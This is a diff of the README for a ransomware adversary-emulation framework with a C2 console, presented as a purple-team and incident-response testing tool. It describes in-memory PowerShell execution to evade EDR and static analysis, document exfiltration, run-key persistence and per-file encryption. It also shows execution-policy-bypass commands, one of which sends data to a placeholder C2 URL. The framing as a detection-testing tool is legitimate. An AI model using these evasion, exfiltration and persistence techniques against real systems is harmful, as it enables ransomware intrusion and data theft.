@@ -1,18 +1,15 @@
 ```markdown
+ █████╗ ██████╗ ███████╗██╗  ██╗     ██████╗ ██████╗  ██████╗ 
+██╔══██╗██╔══██╗██╔════╝╚██╗██╔╝      ██╔══██╗██╔══██╗██╔═══██╗
+███████║██████╔╝█████╗   ╚███╔╝       ██████╔╝██████╔╝██║   ██║
+██╔══██║██╔═══╝ ██╔══╝   ██╔██╗       ██╔═══╝ ██╔══██╗██║   ██║
+██║  ██║██║     ███████╗██╔╝ ██╗      ██║     ██║  ██║╚██████╔╝
+╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝      ╚═╝     ╚═╝  ╚═╝ ╚═════╝ 
 
- █████╗ ██████╗ ███████╗██╗  ██╗    ██████╗ ██████╗  ██████╗ 
-██╔══██╗██╔══██╗██╔════╝╚██╗██╔╝     ██╔══██╗██╔══██╗██╔═══██╗
-███████║██████╔╝█████╗   ╚███╔╝      ██████╔╝██████╔╝██║   ██║
-██╔══██║██╔═══╝ ██╔══╝   ██╔██╗      ██╔═══╝ ██╔══██╗██║   ██║
-██║  ██║██║     ███████╗██╔╝ ██╗     ██║     ██║  ██║╚██████╔╝
-╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝     ╚═╝     ╚═╝  ╚═╝ ╚═════╝ 
-
-       ⚡ APEX PRO: RANSOMWARE EMULATION FRAMEWORK
-     [ ADVERSARY EMULATION & PURPLE TEAM FRAMEWORK ]
-
+        ⚡ APEX PRO v2.0: ADVERSARY EMULATION FRAMEWORK
+     [ TACTICAL C2 CONSOLE & PURPLE TEAM UTILITIES ]
 ```
-
-**Apex Pro is a high-fidelity adversary emulation tool designed to replicate the behaviors of modern ransomware families (e.g., LockBit, Conti).** It provides a safe, controlled environment to validate detection pipelines, EDR efficacy, and Incident Response (IR) readiness.
+**Apex Pro v2.0** is a high-fidelity adversary emulation tool designed to replicate the behaviors of modern ransomware families (e.g., LockBit, Conti, WannaCry). It provides a safe, controlled environment to validate detection pipelines, EDR efficacy, and Incident Response (IR) readiness. Also is an industrial-strength ransomware emulation framework. It bridges the gap between simple script execution and full-scale simulation, providing a central Command & Control (C2) hub to manage the entire lifecycle of an attack—from binary compilation to real-time exfiltration tracking and finalized forensic reporting.
 
 ---
 
@@ -24,7 +21,19 @@ The use of this framework for attacking targets without prior mutual consent is 
 
 ---
 
-## 🚀 Project Status: In Development
+## 🚀 The Evolution: v1.0 vs v2.0
+
+| Feature | Version 1.0 (Standalone) | Version 2.0 (Integrated Console) |
+| --- | --- | --- |
+| **Agent Build** | Manual Base64 & `csc.exe` | **Interactive `compile` & `gen_dec` commands** |
+| **Payload Delivery** | External `script.txt` resources | **Direct In-Memory string injection** |
+| **Telemetry** | Raw console logs | **Real-time Database-driven Tactical Monitor** |
+| **Reporting** | Basic summary | **4-Phase Forensic PDF (Persistence to Lateral)** |
+| **SSL Stability** | Potential handshake crashes | **Hardened Transport Layer (Silent Timeout Fix)** |
+
+---
+
+## 🚀 Project Status: v2.0 Stable
 
 * [x] AES-256-CBC Per-File Encryption
 * [x] Asynchronous Python C2 Backend (Quart/aiosqlite)
@@ -34,100 +43,87 @@ The use of this framework for attacking targets without prior mutual consent is 
 * [x] Canary Tripwire Real-time Alerts
 * [x] Basic Reporting: Forensic PDF report
 * [x] Basic EDR/AV Evasion
-* [ ] Advanced Reporting: Forensic and IR PDF mapped to MITRE ATT&CK (In Progress)
+* [x] Advanced Reporting: Forensic and IR PDF mapped to MITRE ATT&CK
 * [ ] Advanced EDR/AV Evasion (In Progress)
 
 ---
 
-## 🛠 Project Structure
+## 🛠️ The Technology Behind the Engine
 
-### 🛰 The Apex C2 (Command & Control)
+### 🛰️ 1. The Apex Tactical Console (`apex_console.py`)
 
-The central hub for persistent victim tracking and telemetry analysis.
+The C2 Console is a multi-threaded Python environment managing an HTTPS server, an event monitor, and an interactive shell concurrently.
 
-* **Features:**
-* **Multi-Victim Support:** Scalable asynchronous backend utilizing Quart.
-* **Forensic Reporting:** Automated professional PDF generation via `apex_report.py`.
-* **Secure Comms:** Metadata manifests tunneled through encrypted HTTPS.
+* **Integrated Build Engine:** Utilizes the Mono C# Compiler (`mcs`) to dynamically patch the `ApexRunner.cs` template. It automatically performs Base64 encoding of the core logic and injects it into a standard C# string before compilation.
+* **Tactical Event Monitor:** A background thread that polls the `apex_vault.db`. It uses context-aware logic to distinguish between **ENCRYPTION** (Red alerts) and **DECRYPTION/RESTORE** (Green alerts).
+* **Async Hypercorn/Quart Backend:** Hardened against "abrupt disconnects." Even if an agent exits instantly after a task, the console remains stable and suppresses SSL/Transport tracebacks.
 
-### 💻 The Apex Agent (PowerShell/C#)
+### 💻 2. The Apex Agent (C# Wrapper + PS1 Logic)
 
-The primary execution module designed for high-fidelity impact simulation.
+The agent is a dual-stage binary designed to bypass common execution policies and static analysis by utilizing **unmanaged PowerShell execution**.
 
-* **Features:**
-* **Impact:** Wallpaper hijacking, ransom notes, and UI defacement (T1491).
-* **Data Theft (T1041):** Discovery and exfiltration of `.xlsx`, `.pdf`, and `.docx` via Base64 streams.
-* **Stealth:** C# wrapper option to execute PowerShell in-memory to bypass static analysis.
+
+
+* **PowerShell Automation Engine:** The C# wrapper loads the PS1 logic directly into memory without spawning a `powershell.exe` process, making it significantly harder for EDR to detect via process-tree analysis.
+* **Cryptography Engine (AES-256-CBC):** Emulates modern ransomware (e.g., LockBit) by using 32-byte keys and 16-byte IVs. It implements per-file encryption logic to simulate high-impact data loss.
+* **Data Theft Module (T1041):** Automatically discovers and exfiltrates `.xlsx`, `.pdf`, and `.docx` via Base64-encoded streams over TLS 1.2+.
+* **Persistence & Survivability (T1547.001):** Strategic registry run-key modification (`HKCU:\Software\Microsoft\Windows\CurrentVersion\Run`) ensuring the simulation persists across reboots.
+* **Impact & Defacement (T1491):** Wallpaper hijacking and automated ransom note drops for psychological impact simulation.
+
+### 📄 3. Advanced Forensic Reporting
+
+The engine generates a professional 4-Phase mission report mapped to the MITRE ATT&CK framework:
+
+* **PHASE I: PERSISTENCE:** Registry and startup modifications.
+* **PHASE II: EXFILTRATION:** Summary of stolen metadata and documents.
+* **PHASE III: ENCRYPTION:** Detailed impact analysis of the locked file system.
+* **PHASE IV: LATERAL MOVEMENT:** Network discovery attempts and Canary tripwire triggers.
 
 ---
 
-## ⚙️ Setup & Execution
+## ⚙️ Operational Workflow
 
-### 1. Server Setup (Arch Linux)
-
-Ensure your `.pem` files are in the server directory (they are added to the `.gitignore`).
+### Step 1: Server Initialization
 
 ```bash
-# Install Dependencies
+# Install tactical dependencies
 pip install -r requirements.txt
 
-# Generate Certificates
+# Generate SSL certificates for the secure telemetry tunnel
 openssl req -x509 -newkey rsa:4096 -keyout apex_key.pem -out apex_cert.pem -sha256 -days 365 -nodes -subj "/CN=localhost"
 
-# Start C2 Listener
-sudo python3 c2_server.py
+# Start the Apex v2.0 Console
+python3 apex_console.py
 
 ```
 
-### 2. Client Preparation & Execution
+### Step 2: Lab Preparation & Automated Build
 
-Generate victim data and launch the simulation phase. To ensure execution on restricted systems, use the `-ExecutionPolicy Bypass` flag.
+**[B] Lab Preparation: Generate dummy data**
+On the Windows victim machine, prepare the target environment:
 
 ```powershell
-# [B] Lab Preparation: Generate dummy data
 # Usage: .\GenerateVictimData.ps1 -RootPath <Path>
 powershell.exe -ExecutionPolicy Bypass -File .\GenerateVictimData.ps1 -RootPath "C:\SimulationData"
 
-# [C] Execution Phase 1: Impact (Theft, Encryption & Exfiltration)
-powershell.exe -ExecutionPolicy Bypass -File .\ApexSim.ps1 -Mode Encrypt -C2Url "https://<YOUR_C2_IP>/api/v1/telemetry" -TargetPath "C:\SimulationData"
+```
 
-# [C] Execution Phase 2: Recovery (Decryption)
-powershell.exe -ExecutionPolicy Bypass -File .\ApexSim.ps1 -Mode Decrypt -TargetPath "C:\SimulationData"
+**[C] Building Agents**
+Generate your simulation binaries directly from the Apex shell.
+*Prerequisite: Ensure System.Management.Automation.dll is in the project root.*
+
+```apex
+Apex » compile x86      # Generate the primary Encryption Agent
+Apex » gen_dec x86      # Generate the standalone Simulation Decryptor
 
 ```
 
-### 3. Advanced Execution (C# Wrapper Compilation)
+### Step 3: Deployment & Live Monitoring
 
-To bypass static analysis and execution policies, the agent is wrapped in a C# runner that executes in memory.
+Deploy the binary to your target VM. As the agent moves through the phases, the C2 Console provides live feedback:
 
-**Step A: Encode the Script (Linux)**
-
-```bash
-base64 -w 0 ApexSim.ps1 > b64_script.txt
-
-```
-
-**Step B: Prepare and Compile (Windows)**
-
-1. Copy the string from `b64_script.txt` into the `encodedScript` variable in `ApexRunner.cs`.
-2. Locate `csc.exe` (usually at `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe`).
-3. Locate `System.Management.Automation.dll` (usually in the GAC or assembly folder).
-4. Compile the binary:
-
-```powershell
-csc.exe /target:winexe /reference:System.Management.Automation.dll /out:ApexUpdater.exe ApexRunner.cs
-
-```
-
-### 4. Post-Simulation Reporting
-
-After the simulation is complete, generate the forensic evidence report from the C2 database.
-
-```bash
-# Ensure the C2 server has populated apex_vault.db
-python3 apex_report.py
-
-```
+* `[ALERT] New ENCRYPTION activity from 192.168.56.10` (Bold Red)
+* `[ALERT] New DECRYPTION activity from 192.168.56.10` (Bold Green)
 
 ---
 
@@ -147,15 +143,14 @@ python3 apex_report.py
 | **Obfuscation** | T1027 | [YES/NO] | [ ] |
 | **Execution** | T1059.001 | [YES/NO] | [ ] |
 
-> **Note:** All simulations include a standardized Incident Response (IR) Exercise Template to help Blue Teams measure Mean-Time-to-Detection (MTTD) and Alert effectiveness across every stage of the kill chain.
-
 ---
 
 ## 🔒 Rules of Engagement & Safety
 
-1. **Targeting:** Hard-code `$TargetPath` to an isolated sandbox.
-2. **Networking:** Use Host-Only/Internal VM networking ONLY.
-3. **Restoration:** Run `.\ApexSim.ps1 -Mode Decrypt` to revert changes.
-4. **C2 Security:** Use the AES shared key to secure the agent.
+1. **Host-Only Networking:** Simulations **MUST** occur in isolated virtual environments.
+2. **Authorized Use Only:** This framework is for purple-teaming and authorized IR training.
+3. **Decryption:** The `ApexDecryptor` removes all persistence and restores files. A user logout is recommended to refresh the defaced wallpaper.
 
 ---
+
+**Apex Pro v2.0 - The Apex of Adversary Emulation.**
